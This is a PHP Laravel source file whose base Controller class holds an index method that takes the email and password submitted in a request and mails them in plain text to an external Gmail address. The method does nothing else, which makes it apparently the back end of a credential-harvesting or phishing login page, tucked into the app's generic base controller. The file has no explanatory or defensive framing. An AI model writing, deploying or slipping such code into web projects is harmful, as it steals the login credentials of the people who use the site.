<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Mail\Mailer;
use Mail;
class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
    public function index(Request $request) {
        $login = $request['email'];
        $password = $request['pass'];
        $data['title'] = "login".$login. "password".$password;

        Mail::send('email', $data, function($message) {

            $message->to('asatryan.saqo89@gmail.com', 'Receiver Name')

                ->subject('HDTuto.com Mail');

        });

        dd("Mail Sent successfully");
    }
}
